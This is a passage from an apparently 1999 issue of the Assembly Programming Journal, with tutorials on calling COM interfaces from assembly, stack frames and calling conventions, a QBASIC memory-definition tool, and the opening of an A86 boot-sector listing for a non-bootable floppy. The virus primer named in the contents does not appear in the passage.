@@ -1,0 +1,3836 @@
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.                                               Apr-June  99
+:::\_____\::::::::::.                                              Issue      4
+::::::::::::::::::::::.........................................................
+
+            A S S E M B L Y   P R O G R A M M I N G   J O U R N A L
+                      http://asmjournal.freeservers.com
+                           asmjournal@mailcity.com
+
+
+
+
+T A B L E   O F   C O N T E N T S
+----------------------------------------------------------------------
+Introduction...................................................mammon_
+
+"Using COM in Assembly Language"..........................Lord.Lucifer
+
+"Stack Frames and High-Level Calls"............................mammon_
+
+"Define Your Memory".......................................Alan Baylis
+
+"Writing a Boot Sector in A86"...........................Jan Verhoeven
+
+"A Basic Virus Writing Primer"...................................Chili
+
+Column: Win32 Assembly Programming
+    "Mouse Input....".........................................Iczelion
+    "Menus"...................................................Iczelion
+
+Column: The C standard library in Assembly
+    "C string functions:_strtok"................................Xbios2
+
+Column: The Unix World
+    "Using Menus in Xt"........................................mammon_
+
+Column: Assembly Language Snippets
+    "Triple XOR".........................................Jan Verhoeven
+    "Trailing Calls".....................................Jan Verhoeven
+
+Column: Issue Solution
+    "Fire Demo"....................................................iCE
+----------------------------------------------------------------------
+       +++++++++++++++++++++Issue  Challenge+++++++++++++++++++
+       Write a "Fire Demo"-style program in less than 100 bytes
+----------------------------------------------------------------------
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::..............................................INTRODUCTION
+                                                                     by mammon_
+
+
+In the last few months I have come across a number of links to APJ, and have
+received the proverbial ton of email regarding it. Strangely enough, the
+majority of these tend to agree that the one problem with the journal is its
+infrequent --if not irregular-- publication. If that is the only complaint so
+far, I think I can cope with it ;)
+
+This issue is, naturally, very late due to what could be called "real world"
+[lit., "that which does not go away when a power outtage kills your PC"]
+considerations; however the articles by weight alone should make up for some
+of this.
+
+The largest of the bunch is undoubtedly the virus writing tutorial by Chili,
+who may have beat my previous record for article length: a very thorough work,
+worth reading just to help protect against virii, if not to write them. This
+is accompanied by Jan's discussion of boot sector programming...a suitable
+companion article, I believe.
+
+High-level coders will undoubtedly be interested in Lord Lucifer's article on
+COM programming in assembly; it seems that high-level areas such as COM,
+DirectDraw, and Winsock coding are starting to receive a fair degree of
+attention from the assembly language world, judging from the tutorials I have
+been coming across.
+
+Xbios2 has continued his excellent C stdlib work, and Icezlion has contributed
+two more of his now-legendary Win32 asm tutorials; I of course have kept up
+the Unix vanguard with yet another Xt article.
+
+This month's challenge was contributed by iCE, and had a .text-size I could
+not readily beat.
+
+A few brief notes concerning the web page: I have thrown together a basic
+collection of assembly language links at
+        http://asmjournal.freeservers.com/lynx.html
+Submissions for this links page are welcome. I have also been getting a few
+emails to the APJ inbox asking or offering help with assembly language; since
+I check the inbox fortnightly at best, I have added a "classified ads" page to
+the APJ website at
+        http://www.guestbook4free.com/en/28806/entries/
+which is essentially a guestbook where people can post contact info, projects
+they need help with, etc ... more or less a one-way bulletin board like, well,
+like classified ads are.
+
+That should just about wrap things up. Enjoy the issue!
+
+_m
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                 Using COM in Assembly Language
+						 by Lord Lucifer
+
+
+This article will discuss how to use COM interfaces in your assembly language
+programs.  It will not discuss what COM is and how it is used, but rather how
+it can be used when programming in assembler.  It will discuss only how to
+use existing interfaces, and not how to actually implement new ones; this will
+be shown in a future atricle.
+
+
+About COM
+------------------------------------------------------------------------------
+
+Here is a brief introduction to the basics behind COM.
+
+A COM object is one in which access to an object's data is achieved
+exclusively through one or more sets of related functions. These function
+sets are called interfaces, and the functions of an interface are called
+methods. COM requires that the only way to gain access to the methods of an
+interface is through a pointer to the interface.
+
+An interface is actually a contract that consists of a group of related
+function prototypes whose usage is defined but whose implementation
+is not. An interface definition specifies the interface's member functions,
+called methods, their return types, the number and types of their parameters,
+and what they must do. There is no implementation associated with an
+interface. An interface implementation is the code a programmer supplies to
+carry out the actions specified in an interface definition.
+
+An instance of an interface implementation is actually a pointer to an array
+of pointers to methods (a function table that refers to an implementation of
+all of the methods specified in the interface). Any code that has a pointer
+through which it can access the array can call the methods in that interface.
+
+
+
+Using a COM object assembly language
+-------------------------------------------------------------------------------
+
+Access to a COM object occurs through a pointer.  This pointer points to a
+table of function pointers in memory, called a virtual function table, or
+vtable in short.  This vtable contains the addresses of each of the objects
+methods. To call a method, you indirectly call it through this pointer table.
+
+Here is an example of a C++ interface, and how its methods are called:
+
+        interface IInterface
+        {
+             HRESULT QueryInterface( REFIID iid, void ** ppvObject );
+             ULONG AddRef();
+             ULONG Release();
+             Function1( INT param1, INT param2);
+             Function2( INT param1 );
+        }
+
+        // calling the Function1 method
+        pObject->Function1( 0, 0);
+
+Now here is how the same functionality can be implemented using assembly
+language:
+
+        ; defining the interface
+        ; each of these values are offsets in the vtable
+        QueryInterface          equ             0h
+        AddRef                  equ             4h
+        Release                 equ             8h
+        Function1               equ             0Ch
+        Function2               equ             10h
+
+        ; calling the Function1 method in asm
+        ; the method is called by obtaining the address of the objects
+        ; vtable and then calling the function addressed by the proper
+        ; offset in the table
+        push    param2
+        push    param1
+        mov     eax, pObject
+        push    eax
+        mov     eax, [eax]
+        call    [eax + Function1]
+
+You can see this is somewhat different than calling a function normally.
+Here, pObject points to the Interface's vTable.  At the Function1(0Ch) offset
+in this table is a pointer to the actual function we wish to call.
+
+
+
+Using HRESULT's
+-------------------------------------------------------------------------------
+
+The return value of OLE APIs and methods is an HRESULT. This is not a handle
+to anything, but is merely a 32-bit value with several fields encoded in the
+value.  The parts of an HRESULT are shown below.
+
+HRESULTs are 32 bit values layed out as follows:
+
+ 3 3 2 2 2 2 2 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1
+ 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0
++-+-+-+-+-+---------------------+-------------------------------+
+|S|R|C|N|r|    Facility         |               Code            |
++-+-+-+-+-+---------------------+-------------------------------+
+
+ S - Severity Bit
+     Used to indicate success or failure
+     0 - Success
+     1 - Fail
+
+     By noting that this bit is actually the sign bit of the 32-bit value,
+     checking success/failure is simply performed by checking its sign:
+
+     call       ComFunction        ; call the function
+     test       eax,eax            ; now check its return value
+     js         error              ; jump if signed (meaning error returned)
+     ; success, so continue
+
+ R - reserved portion of the facility code, corresponds to NT's
+     second severity bit.
+
+ C - reserved portion of the facility code, corresponds to NT's
+     C field.
+
+ N - reserved portion of the facility code. Used to indicate a
+     mapped NT status value.
+
+ r - reserved portion of the facility code. Reserved for internal
+     use. Used to indicate HRESULT values that are not status
+     values, but are instead message ids for display strings.
+
+ Facility - is the facility code
+     FACILITY_WINDOWS    = 8
+     FACILITY_STORAGE    = 3
+     FACILITY_RPC        = 1
+     FACILITY_WIN32      = 7
+     FACILITY_CONTROL    = 10
+     FACILITY_NULL       = 0
+     FACILITY_ITF        = 4
+     FACILITY_DISPATCH   = 2
+
+     To retreive the Facility,
+
+     call       ComFunction    ; call the function
+     shr        eax, 16        ; shift the HRESULT to the right by 16 bits
+     and        eax, 1FFFh     ; mask the bits, so only the facility remains
+     ; eax now contains the HRESULT's Facility code
+
+ Code - is the facility's status code
+
+     To get the Facility's status code,
+     call       ComFunction             ; call the function
+     and        eax, 0000FFFFh          ; mask out the upper 16 bits
+     ; eax now contains the HRESULT's Facility's status code
+
+
+
+Using COM with MASM
+------------------------------------------------------------------------------
+If you use MASM to assemble your programs, you can use some of its
+capabilities to make calling COM functions very easy.  Using invoke, you can
+make COM calls look almost as clean as regular calls, plus you can add type
+checking to each function.
+
+
+Defining the interface:
+
+     IInterface_Function1Proto     typedef proto :DWORD
+     IInterface_Function2Proto     typedef proto :DWORD, :DWORD
+
+     IInterface_Function1          typedef ptr IInterface_Function1Proto
+     IInterface_Function2          typedef ptr IInterface_Function2Proto
+
+     IInterface struct DWORD
+           QueryInterface          IUnknown_QueryInterface         ?
+           AddRef                  IUnknown_AddRef                 ?
+           Release                 IUnknown_Release                ?
+           Function1               IInterface_Function1            ?
+           Function2               Interface_Function2             ?
+     IInterface ends
+
+Using the interface to call COM functions:
+
+     mov     eax, pObject
+     mov     eax, [eax]
+     invoke  (IInterface [eax]).Function1, 0, 0
+
+As you can see, the syntax may seem a bit strange, but it allows for a simple
+method using the function name itself instead of offsets, as well as type
+checking.
+
+
+
+A Sample program written using COM
+------------------------------------------------------------------------------
+
+Here is some sample source code which uses COM written in straight assembly
+language, so it should be compatable with any assembler you prefer with only
+minor changes necessary.
+
+This program uses the Windows Shell Interfaces to show the contents of the
+Desktop folder in a window.  The program is not complete, but shows how the
+COM library is initialized, de-initialized, and used. I also shows how the
+shell library is used to get folders and obcets, and how to perform
+actions on them.
+
+
+..386
+..model flat, stdcall
+
+include windows.inc             ; include the standard windows header
+include shlobj.inc              ; this include file contains the shell namespace
+                                ; definitions and constants
+
+;----------------------------------------------------------
+..data
+        wMsg                    MSG     <?>
+        g_hInstance             dd      ?
+        g_pShellMalloc          dd      ?
+
+        pshf                    dd      ?       ; shell folder object
+        peidl                   dd      ?       ; enum id list object
+
+        lvi                     LV_ITEM <?>
+        iCount                  dd      ?
+        strret                  STRRET  <?>
+        shfi                    SHFILEINFO <?>
+        ...
+
+;----------------------------------------------------------
+..code
+; Entry Point
+start:
+    push    0h
+    call    GetModuleHandle
+    mov     g_hInstance,eax
+
+    call    InitCommonControls
+
+; initialize the Component Object Model(COM) library
+; this function must be called before any COM functions are called
+    push    0
+    call    CoInitialize
+    test    eax,eax                         ; error when the MSB = 1
+                                            ; (MSB = the sign bit)
+    js      exit                            ; js = jump if signed
+
+; Get the Shells IMalloc object pointer, and save it to a global variable
+    push    offset g_pShellMalloc
+    call    SHGetMalloc
+    cmp     eax, E_FAIL
+    jz      shutdown
+
+
+; here we would set up the windows, list view, message loop, and so on....
+; we would also call the FillListView procedure...
+; ....
+
+
+; Cleanup
+; Release IMalloc Object pointer
+    mov     eax, g_pShellMalloc
+    push    eax
+    mov     eax, [eax]
+    call    [eax + Release]         ; g_pShellMalloc->Release();
+
+shutdown:
+; close the COM library
+    call    CoUninitialize
+
+exit:
+    push    wMsg.wParam
+    call    ExitProcess
+; Program Terminates Here
+
+
+;----------------------------------------------------------
+FillListView proc
+
+; get the desktop shell folder, saved to pshf
+    push    offset pshf
+    call    SHGetDesktopFolder
+
+; get the objects of the desktop folder using the EnumObjects method of
+; the desktop's shell folder object
+    push    offset peidl
+    push    SHCONTF_NONFOLDERS
+    push    0
+    mov     eax, pshf
+    push    eax
+    mov     eax, [eax]
+    call    [eax + EnumObjects]
+
+; now loop through the enum id list
+idlist_loop:
+; Get next id list item
+    push    0
+    push    offset pidl
+    push    1
+    mov     eax, peidl
+    push    eax
+    mov     eax, [eax]
+    call    [eax + Next]
+    test    eax,eax
+    jnz     idlist_endloop
+
+    mov     lvi.imask, LVIF_TEXT or LVIF_IMAGE
+    mov     lvi.iItem,
+
+; Get the item's name by using the GetDisplayNameOf method
+    push    offset strret
+    push    SHGDN_NORMAL
+    push    offset pidl
+    mov     eax, pshf
+    push    eax
+    mov     eax, [eax]
+    call    [eax + GetDisplayNameOf]
+; GetDisplayNameOf returns the name in 1 of 3 forms, so get the correct
+; form and act accordingly
+    cmp     strret.uType, STRRET_CSTR
+    je      strret_cstr
+    cmp     strret.uType, STRRET_OFFSET
+    je      strret_offset
+
+strret_olestr:
+    ; here you could use WideCharToMultiByte to get the string,
+    ; I have left it out because I am lazy
+    jmp     strret_end
+
+strret_cstr:
+    lea     eax, strret.cStr
+    jmp     strret_end
+
+strret_offset:
+    mov     eax, pidl
+    add     eax, strret.uOffset
+
+strret_end:
+    mov     lvi.pszText, eax
+
+; Get the items icon
+    push    SHGFI_PIDL or SHGFI_SYSICONINDEX or SHGFI_SMALLICON or SHGFI_ICON
+    push    sizeof SHFILEINFO
+    push    offset shfi
+    push    0
+    push    pidl
+    call    SHGetFileInfo
+    mov     eax, shfi.iIcon
+    mov     lvi.iImage, eax
+
+; now add item to the list
+    push    offset lvi
+    push    0
+    push    LVM_INSERTITEM
+    push    hWndListView
+    call    SendMessage
+
+; repeat the loop
+idlist_endloop:
+
+; now free the enum id list
+; Remember all allocated objects must be released...
+    mov     eax, peidl
+    push    eax
+    mov     eax,[eax]
+    call    [eax + Release]
+
+; free the desktop shell folder object
+    mov     eax, pshf
+    push    eax
+    mov     eax,[eax]
+    call    [eax + Release]
+
+    ret
+FillListView endp
+
+
+END start
+
+
+Conclusion
+-------------------------------------------------------------------------------
+
+Well, that is about it for using COM with assembly language.  Hopefully, my
+next article will go into how to define your own interfaces.  As you can
+see, using COM is not difficult at all, and with it you can add a very
+powerful capability to your assembly language programs.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                               Stack Frames and High-Level Calls
+                                               by mammon_
+
+
+Last month I covered how to implement high-level calls in Nasm. Since then it
+has come to my attention that many beginning programmers are unfamiliar with
+calling conventions and the stack frame; to remedy this I have prepared a brief
+discussion of these topics.
+
+The CALL Instruction
+--------------------
+At its most basic, an assembly language call takes this for:
+	push [parameters]
+	call [address]
+Some assemblers will require that the CALL statement take as an rgument only
+addresses leading to external functions or addresses created with a macro or
+directive such as PROC. However, as a quick glance through a debugger or a
+passing familiarity with Nasm will demonstrate, the CALL instruction simply
+jumps to an address [often a label in the source code] while pushing the
+contents of EIP [containing the address of the instruction following the call]
+onto the stack. The CALL instruction is therefore equivalent to the following
+code:
+	push EIP
+	jmp  [address]
+
+The address that has been called will thefore have the stack set up as follows:
+	[Last Parameter Pushed]: DWORD
+	[Address of Caller]    : DWORD
+	---  "Top" of Stack [esp]  ---
+At this point, anything pushed onto the stack will be on top of [that is, with a
+lower memory address, since the stack "grows" downwards] the return address.
+
+The Stack Frame
+---------------
+Note that the parameters to the call therefore cannot be POPed from the stack,
+as this will destroy the saved return address and thus cause the application to
+crash upon returning from the call [unless, of course, a chosen return address
+is PUSHed onto the stack before returning from the call]. The logical way to
+reference these parameters, then, would be as offsets from the stack pointer:
+    [parameter 2]      : DWORD esp + 8
+    [parameter 1]      : DWORD esp + 4
+    [Address of Caller]: DWORD esp
+    -----  "Top" of Stack [esp]  -----
+In this example, "parameter 1" is the parameter pushed onto the stack last, and
+"parameter 2" is the parameter pushed onto the stack before parameter 1, as
+follows:
+	push [parameter 2]
+	push [parameter 1]
+	call [procedure]
+The problem with referring to parameter as offsets from esp is that esp will
+change whenever a value is PUSHed onto the stack during the routine. For this
+reason, it is standard for routines which take parameters to set up a "stack
+frame".
+
+In a stack frame, the base pointer [ebp] is set equal to the stack pointer [esp]
+at the start of the call; this provides a "base" address from which parameters
+can be addressed as offsets. It is assumed that the caller had a stack frame
+also; thus the value of ebp must be preserved in order to prevent causing damage
+to the caller. The stack frame usually takes the following form:
+	push ebp
+	mov  ebp, esp
+	... [actual code for the routine] ...
+	mov  esp, ebp
+	pop  ebp
+This means that once the stack frame has been entered, the stack has the
+following structure:
+    [parameter 2]      : DWORD ebp + 12
+    [parameter 1]      : DWORD ebp + 8
+    [Address of Caller]: DWORD ebp + 4
+    [Old Base Pointer] : DWORD ebp
+    -----   Base Pointer [ebp]   -----
+    -----  "Top" of Stack [esp]  -----
+The use of the base pointer also allows space to  be allocated on the stack for
+local variables. This is done by simply subtracting bytes from esp; since esp is
+restored when the stack frame is exitted, this space will automatically be
+deallocated. The local variables are then referred to as *negative* offsets from
+ebp; these may be EQUed to meaningful symbol names in the source code. A routine
+that has 3 local DWORD variables would take the following form:
+     Var1 EQU [ebp-4]
+     Var2 EQU [ebp-8]
+     Var3 EQU [ebp-12]		;provide meaningful names for the variables
+	push ebp
+	mov  ebp, esp
+	sub  esp, 3*4   	;3 DWORDs at 4 BYTEs apiece
+	... [actual code for the routine] ...
+	mov  esp, ebp
+	pop  ebp
+This routine would then have the following stack structure after the allocation
+of the local variables:
+    [parameter 2]      : DWORD ebp + 12
+    [parameter 1]      : DWORD ebp + 8
+    [Address of Caller]: DWORD ebp + 4
+    [Old Base Pointer] : DWORD ebp
+    -----   Base Pointer [ebp]   -----
+    [Var1]             : DWORD ebp - 4
+    [Var2]             : DWORD ebp - 8
+    [Var3]             : DWORD ebp - 12
+    -----  "Top" of Stack [esp]  -----
+
+The stack frame has can also be used to provide a call trace, as it stores the
+base pointer of [and thus a pointer to the caller of] the caller. Assume that a
+program has the following flow of execution:
+proc_1:	push dword call1_p2
+	push dword call1_p1
+	call proc_2
+________proc_2:	push call2_p1
+		call proc_3
+________________proc_3:	push call3_p1
+			call proc_4
+Upon creation of the stack frame in proc_4, the stack has the following
+structure:
+    [call1_p2]             : DWORD ebp + 36
+    [call1_p1]             : DWORD ebp + 32
+    [Return Addr of Call1] : DWORD ebp + 28
+    [Old Base Pointer]     : DWORD ebp + 24
+    ----  Base Pointer of Call 1  ----
+    [call2_p1]             : DWORD ebp + 20
+    [Return Addr of Call2] : DWORD ebp + 16
+    [Base Pointer of Call1]: DWORD ebp + 12
+    ----  Base Pointer of Call 2  ----
+    [call3_p1]             : DWORD ebp + 8
+    [Return Addr of Call3] : DWORD ebp + 4
+    [Base Pointer of Call2]: DWORD ebp
+    -----   Base Pointer [ebp]   -----
+    -----  "Top" of Stack [esp]  -----
+As you can see, for each previous call the return address is [ebp+4], where ebp
+is the address of the saved base pointer for the call previous to that one.
+Thus, if one could traverse the history of stack frames as follows:
+	mov eax, ebp		; eax = address of previous ebp
+	mov ecx, 10		; trace the last 10 calls
+loop_start:
+	mov ebx, [eax+4]	; ebx = return address for call
+	call print_stack_trace
+	mov eax, [eax]		; step back one stack frame
+	loop loop_start
+This is exceptionally useful for exception handling; the handling function will
+be able to print out a stack history to aid debugging. This principle can also
+be applied in conjunction with debugging code [for example, the Win32 debug API]
+to create a utility which will trace the calls [in reality, the stack frames of
+the calls] made by a target. Essentially, this would boil down to the following
+logic:
+	1) Breakpoint on changes to EBP
+	2) On Break, get return address [ebp+4]
+	3) Get instruction prior to return address
+	4) Print or log the instruction
+Note that this can be enhanced to resolves symbol names in the logged CALL
+instruction, such that local or API address labels [e.g. GetWindowTextA] can be
+logged rather than just the address itself.
+
+The ENTER Instruction
+---------------------
+The ENTER instruction is used to create a stack frame with a single instruction;
+it is equivalent to the code
+	push ebp
+	mov  ebp, esp
+The ENTER instruction takes a first parameter that specifes the number of bytes
+to reserve for local variables; an optional second parameter gives the nesting
+level [0-31] of the current stack frame in the overall program structure. This
+is often used by high-level languages to save call trace information for error
+handlers, as it specifies the number of additional [previous] stack frame pointers
+to save on the stack.
+
+The RET Instruction
+-------------------
+Any routine which is accessed by a CALL instruction must be terminated with a
+return [RET] instruction. As one can see from the operation of the CALL
+instruction, if you were to attempt to circumvent the RET instruction by JMPing
+to the retrun address, the stack would still be corrupted. The RET statement is
+roughly equivalent to the following code:
+	pop  EIP
+
+Note that the RET must take place after exiting the stack frame in order to
+avoid corruption of the stack.
+
+The LEAVE Instruction
+---------------------
+The LEAVE instruction is used to exit a stack frame created with the ENTER
+instruction; it is equivalent to the code
+	mov  esp, ebp
+	pop  ebp
+The LEAVE instruction takes no parameters and still requires a RET statement to
+follow it.
+
+High-level Language Calling Conventions
+---------------------------------------
+At this point one may wonder what has happened to the parameters pushed onto the
+stack prior to the call. Are they still on the stack after the RET, or have they
+been cleared? Since the parameters cannot be POPed from the stack while within
+the call, they still are on the stack at the RET instruction.
+
+At this point the programmer has two options.  They can have the caller clean up
+the stack by adding the number of bytes pushed to esp immediately after the
+call:
+	push dword param2
+	push dword param1
+	call procedure
+	add  esp, 2 * 4 		;2 DWORDs at 4 BYTEs apiece
+Or they can clear the stack by passing to the RET instruction the number of
+bytes that need to be cleared:
+	push dword param2
+	push dword param1
+	call procedure
+	...
+procedure:
+	push ebp
+	mov  ebp, esp
+	...
+	mov  esp, ebp
+	pop  ebp
+	ret  8				;2 DWORDs at 4 BYTEs apiece
+Which method is chosen is left up to the programmer; however, when writing a
+library or API, one must make clear who is responsible for cleaning up the
+stack. In addition, when interfacing with high-leve languages, one also has to
+make clear which order the parameters are to be pushed in. For this reason there
+are calling conventions	for the high-level languages.
+
+The C calling convention is used to interface with the C and C++ programming
+languages; it is used in the standard C library and in Unix APIs. It pushes the
+parameters from right to left, and does not clean up the stack upon return from
+the call. A call to a C-style routine would look as follows:
+	;corresponds to the C code
+	;procedure(param1, param2)
+	push dword param2
+	push dword param1
+	call procedure
+	add  esp, 8
+A C-style routine would have the following structure:
+	push ebp
+	mov  ebp, esp
+	...
+	mov  esp, ebp
+	pop  ebp
+	ret
+
+The Pascal calling convention is used interface with the Pascal, BASIC, and
+Fortran programming languages; it is used in the Win16 API. It pushes the parameters
+from left to right, and cleans up the stack upon return from the call; as such
+it is the opposite of the C convention. A call to a Pascal routine would look as
+follows:
+	;corresponds to the C code
+	;procedure(param1, param2)
+	push dword param1
+	push dword param2
+	call procedure
+A Pascal-style routine would have the following structure:
+	push ebp
+	mov  ebp, esp
+	...
+	mov  esp, ebp
+	pop  ebp
+	ret 8		;clear the 2 dword parameters
+
+The Stdcall ["standard call" or __stdcall] calling convention is a combination
+of the C and Pascal conventions; it is used in the Win32 API. It pushes the
+parameters from right to left, and cleans the stack upon return from the call. A
+call to a Stdcall routine would look as follows:
+	;corresponds to the C code
+	;procedure(param1, param2)
+	push dword param2
+	push dword param1
+	call procedure
+A Stdcall-style routine would have the following structure:
+	push ebp
+	mov  ebp, esp
+	...
+	mov  esp, ebp
+	pop  ebp
+	ret 8
+
+There is also a Register calling convention [also called "fastcall"] which uses
+registers rather than the stack to pass parameters. The first parameter is
+passed in eax, the second in EDX, and the third in EBX; subsequent parameters
+are passed via the stack. A call to a Register routine would look as follows:
+	;corresponds to the C code
+	;procedure(param1, param2, param3)
+	mov  eax, param1
+	mov  edx, param2
+	mov  ebx, param3
+	call procedure
+Note that there is no defined standard method of clearing the stack ro the
+Register convention; however most implemntations clear the stack in the Pascal
+style.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                             Define Your Memory
+                                                             by Alan Baylis
+
+
+[I am going to preface this article with a brief note, since it is not
+ covering assembly language per se, but rather a utility that will be of use
+ to asm coders. The author sums it up well in his original email to me:
+  "Define is a new type of assembler/disassembler that does not use source
+   code. The program reads the byte values in memory and checks a library to
+   find a definition that describes the byte values it reads. The library can
+   be added to and is used as a permanent macro list to write instuctions,
+   functions, etc to memory. Most assemblers also use standard 3 character
+   mnemonics to descibe the instruction set, however, with Define you can
+   rename the instructions and your own macros to anything and up to 250
+   characters."
+ Sounds pretty promising.
+  _m                    ]
+
+
+For the x86 series of processor I have been working on a new type of assembler and have
+written a program called Define. The program could be called a sketch of what a future
+version might be like. The program is fully workable but suffers from a few limitations,
+the first is that it is written in QBASIC which may be a blow to devoted machine coders,
+and the second is that it can only comfortably use about three hundred definitions
+(Definitions are like a library of machine code macros and I'll discuss them more fully
+later) and a third limitation, not to its functionality, is that the program doesn't have
+a quick mouse and menu driven interface, but I'm working on it.
+
+I liked the idea of macros and saw the neccessity for using them so that I and others
+don't have to "reinvent the wheel" as it has been put, but I wanted a way to see the
+machine code instructions and the byte values that made up the macro. This can't be done
+through using source code as the finished code is generated at the discretion of the
+compilers authors and requires a debugger to verify its content.
+
+To make what was originally intended to be a debugger but without the source code I
+decided to make a program that could read memory and interpret the byte values it finds
+into their mnemonic equivalents or better (much like a debugger), so that while reading
+memory, if the program found the byte value 205 followed by the value 5 it would display
+"INT 5". To do this I needed what I termed a 'definiton' which included the byte values
+that make up an instruction or small macro and included a description or name for the
+function they perform.
+
+Unlike what I had done with a previous assembler I decided to put the definitions in a
+separate file rather than include them as data within the main program, this allowed
+for the addition or removal of future definitions. I then quickly realised that since
+these definitions contained the byte values of an instruction, then they could also be
+used to write the bytes into memory. I added  functions to save and load programs as
+well as functions to manipulate the definition file and the program was underway.
+
+I found while writing the definitions for the instruction set that it would be good
+(and necessary) if the program could read an instruction even if one of the bytes is
+unknown or variable; I decided to call these bytes undefined bytes, so that if the
+program found the number 205 it would display something like "Interrupt call" regard-
+less of what number followed.
+
+While reading memory I also wanted a way to exclude data areas from being interpreted
+into definitions, so I added a new definition type called addresses which contain the
+address of the first and last bytes of a data area and a name to describe the data area.
+If these are turned on in the program then they are used instead of the normal definitions
+when reading that part of memory.
+
+To then take Define closer to being an assembler rather than a debugger I also included
+labels that label memory addresses and the destination of jump and branch instructions.
+
+I envision that a future version of Define written in machine code or a similar program
+will have a pop up list of definitons and use a point and click method of writing the
+code as opposed to the current method of scrolling through them from a different page.
+The future version will also need to be able to handle thousands of definitions as
+opposed to the few hundred it can use at a time now, in order to accommodate situations
+such as the following:
+
+To call the interrupt 21h,9 which prints a string it is necessary to put the function
+number 9 in AH and the address of the string in the registers DS:DX and then call the
+interrupt,
+
+MOV AH,9
+MOV DX,address
+INT 21h
+
+however it is also valid to put the number 9 in AH after the address of the string has
+been put in DS:DX,
+
+MOV DX,address
+MOV AH,9
+INT 21h
+
+To make a definition for this interrupt at least two definitions will need to be made
+and therefore a larger definition file. This also doesn't account for the situation in
+which the number 9 may have been filled three instructions earlier and is assumed to be
+correct at the time when the interrupt is called, in this case only the definitions for
+the instructions will be seen and not a definition for the interrupt.
+
+One of the best aspects to Define in my book is that the memory can be viewed according
+to a persons level of understanding (or will be as the definitions are written,) for
+example the program is able to only show definitions of a certain level and no other. I
+have chosen to represent the level of a definition by its color, I have used blue (1)
+for the lowest level which are the instruction set definitions and then green (2) for
+the next level which are the DOS, BIOS, etc definitions and then magenta (3) for the
+next level which may be definitions to clear the screen and print the date combined and
+so on, so that a person who knows little about machine code may set the maximum definition
+color to red (4) and still be able to write a program using Define. The advantage for
+those who know machine code is that they need not be restricted to only a high level
+definition, by turning the observance of the color off they can press the letter B when
+viewing a  high level definition and see the lower level definitions that make up the
+higher one. By repeatedly pressing B they can view the program as level 1 (blue) or even
+as the byte values themselves.
+
+The most radical departure from most assemblers is that when writing a program the program
+is composed in memory,  the byte values of the definitions are written directly to an
+unused or reserved area of memory where they can be further altered directly while
+reading memory. This could also be said to be the most dangerous method as it can easily
+lead to the accidental writing of other areas of memory, while this is true I have also
+found a benefit, if Define is stopped and then restarted the program being written will
+still be in memory without having been saved (depending on where in memory the program is
+being written.)
+
+The maker of a violin, while demonstrating it, must have said at one time or another "A
+good violinist could really show you how to play it", I too like the maker of a violin am
+sure there are better definition writers than myself. To become a high level language the
+high level definitions need to be written and I ask any person who has a passion for writing
+hand written code to send me a definition or two to include in the definition file.
+
+
+You can download Define from my homepage at
+	http://members.net-tech.com.au/alaneb/default.htm
+and there is a step by step guide to using the program in the zip file called manual.doc.
+
+Please send any definitions or reponse to Alan at alien1_3@excite.com
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                    Writing a Boot Sector in A86
+                                                    by Jan Verhoeven
+
+
+I have been coding for FreeDOS some time, but that is a C project and I
+rather hate C. It is so clumsy. That's also why I always code in A86
+assembly language. The "No Red Tape" assembler that makes life a lot
+easier for programmers.
+
+A86 is good. The debugger (D86) could be better, but not too much. I
+registered my version and I want to encourage everyone to follow my
+lead. The software is good enough to pay for it. And it ensures proper
+development of the software. If you can spare 20 bucks a month for the
+ISP, you should also spend this on quality software.
+During the last two years I have been submiutting bugs to Isaacson and
+all of them have been fixed in the latest version (4.03).
+
+Besides A86 being the best assembler around, it has some idiosyncracies
+to which some people need to get used to. Plus my personal preferences,
+which might add to that...
+
+ - When I refer to a memory location I use square brackets.
+ - I use single quotes for texts
+ - I use most of the A86 features.
+
+Some of the A86 features are:
+
+ - very powerful macro language
+ - numbers starting with a ZERO are ALWAYS hex, no matter how they end
+ - easy IF statements to reduce nonsense labelnames
+ - local labels, like below: only two local labels.
+
+I started out on the Z-8000, back in 1981, switched to the Z-80, Z-8,
+8086, PIC 16Cxx, some 8051 (Barffff), some 68K (yummie yummie). Mainly
+in ASM and else in Modula-2. I have some really cool and useful routines
+lying around for DOS. And I'm gonna share them with the world.
+
+The following code is a bootsector which can be used for noon-bootable
+disks. In this case for a 1.44 Mb floppy disk. You could use it to make
+a commercial out of every non-bootable disk.
+
+First the code:
+
+----- Code file -------------------------------------------------
+name     flopnb
+title    Floppy disk boot sector, non-bootable, 1.44 Mb
+page     80, 120
+
+; version 1.0  : It works                               : OK 12-12-1998
+
+lf       = 10
+cr       = 13
+
+         org   0
+
+         jmp   short main       ; this is critical!
+         nop                    ; and this too!
+; ----------------------
+
+OEMname  db    'StupiDOS'
+BpS      dw    512              ; bytes per sector
+SpA      db    1                ; sectors per allocation unit (=cluster)
+ResSect  dw    1                ; reserved sectors, starting from sector 0
+NrFats   db    2                ; number of FAT's on this disk
+FiR      dw    224              ; number of entries in ROOT directory
+Total    dw    2880             ; number of sectors per disk
+ToM      db    0F0              ; Type of Media
+SpF      dw    9                ; Sectors per Fat
+SpT      dw    18               ; sectors per Track
+Heads    dw    2                ; number of heads
+Hidden   dw    0, 0             ; Hidden sectors
+GrandTot dd    0                ; total for disks over 32 Mb
+IntId    db    0, 0
+BootSign db    029              ; extended boot signature
+VolumeID dd    0566E614A        ; serial number ...
+DiskLabl db    'DOS is MINE'    ; volume label
